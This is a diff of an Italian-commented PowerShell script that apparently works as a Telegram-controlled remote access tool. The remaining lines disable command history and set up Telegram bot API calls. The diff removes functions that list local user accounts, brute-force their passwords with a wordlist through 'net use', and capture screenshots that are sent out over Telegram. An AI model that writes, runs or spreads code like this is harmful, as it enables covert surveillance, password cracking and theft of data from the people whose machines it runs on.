@@ -7,10 +7,6 @@ Set-PSReadlineOption -HistorySaveStyle SaveNothing
 # Imposta la posizione corrente nella cartella dell'utente
 Set-Location -Path $env:USERPROFILE
 
-# Aggiunge i tipi necessari per utilizzare le finestre di sistema
-Add-Type -AssemblyName System.Windows.Forms
-Add-Type -AssemblyName System.Drawing
-
 # Crea una sessione di richieste web
 $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
 
@@ -26,7 +22,6 @@ $api_get_me         = 'https://api.telegram.org/bot{0}/getMe' -f $api_token
 # Imposta la variabile di preferenza globale $ProgressPreference su 'SilentlyContinue'
 $Global:ProgressPreference = 'SilentlyContinue'
 
-
 # Funzione che verifica se l'utente ha i privilegi di amministratore
 function CheckAdminRights
 {
@@ -36,101 +31,6 @@ function CheckAdminRights
     if ($elevated) { return ("L'utente '$env:USERNAME' ha i privilegi di amministratore") } 
     else { return ("L'utente '$env:USERNAME' non ha i privilegi di amministratore") }
 }
-
-
-# Funzione che ottiene gli account locali
-function GetLocalAccounts
-{
-    # Invia un messaggio indicando che la ricerca degli account validi è in corso
-    SendMessage "Ricerca degli account validi in corso..."    
-    # Invia un messaggio con l'elenco degli account locali trovati
-    SendMessage ("Account trovati: " + (Get-WmiObject Win32_UserAccount | Where-Object { $_.LocalAccount -eq $true -and $_.Status -eq 'OK' }).Name -join ', ')
-}
-
-
-# Funzione per eseguire l'operazione di BruteForce su un account
-function CrackAccount ($account, $wordlist) 
-{
-    # Carica la wordlist in memoria se esiste
-    if (Test-Path $wordlist) { 
-        $wordlist = Get-Content $wordlist; 
-        Log "Wordlist caricata in memoria" 
-    }
-    else { SendMessage "Wordlist inesistente" }
-
-    # Invia un messaggio indicando l'inizio dell'operazione di BruteForce
-    SendMessage "Inizio operazione di BruteForce dell'account $utente"
-
-    try {
-        # Disconnette eventuali connessioni precedenti
-        net use \\127.0.0.1 /d /y 2>&1 | Out-Null
-    } catch { }
-
-    $pass_found = $false
-
-    # Ciclo attraverso la wordlist per provare diverse password
-    foreach ($word in $wordlist) {
-        try {
-            # Prova a connettersi con l'account e la password correnti
-            net use \\127.0.0.1 /user:$account $word 2>&1
-            $exitCode = $LASTEXITCODE
-
-            # Se la connessione è avvenuta con successo, la password è stata trovata
-            if ($exitCode -eq 0) {
-                SendMessage "Password trovata [$account > $word]"
-                net use \\127.0.0.1 /d /y 2>&1 | Out-Null
-                $pass_found = $true
-                break
-            }
-        } catch { }
-    }
-
-    # Se la password non è stata trovata, invia un messaggio appropriato
-    if (!($pass_found)) { SendMessage "Password non trovata" }
-}
-
-# Funzione per catturare uno screenshot della schermata principale
-function GetScreenshot
-{
-    try {
-        # Invia un messaggio indicando l'inizio del processo di cattura dello screenshot
-        SendMessage "Procedo a catturare la schermata..."
-
-        # Ottiene l'oggetto Screen corrispondente alla schermata principale
-        $screen = [System.Windows.Forms.Screen]::AllScreens
-
-        # Crea un oggetto Bitmap con le dimensioni della schermata
-        $bitmap = New-Object System.Drawing.Bitmap $screen.Bounds.Width, $screen.Bounds.Height
-
-        # Crea un oggetto Graphics da associare al Bitmap
-        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-
-        # Copia l'immagine dalla schermata al Bitmap
-        $graphics.CopyFromScreen($screen.Bounds.Location, [System.Drawing.Point]::Empty, $bitmap.Size)
-
-        # Imposta il percorso completo per salvare il file di output nella cartella dell'applicazione
-        $outputPath = Join-Path $env:APPDATA ("screen_"+$env:COMPUTERNAME+".png")
-
-        # Salva il Bitmap come file PNG
-        $bitmap.Save($outputPath, [System.Drawing.Imaging.ImageFormat]::Png)
-
-        # Rilascia le risorse degli oggetti Bitmap e Graphics
-        $bitmap.Dispose()
-        $graphics.Dispose()
-
-        # Invia il file screenshot tramite la funzione SendFile
-        SendFile $outputPath
-
-        # Rimuove il file screenshot dopo l'invio
-        Remove-Item $outputPath -Force
-    }
-    catch {
-        # In caso di errore, invia un messaggio con la descrizione dell'errore
-        SendMessage $Error[0]
-    }
-}
-
-
 
 # Funzione per scaricare un file da Telegram utilizzando l'API
 function DownloadFile($file_id, $file_name)
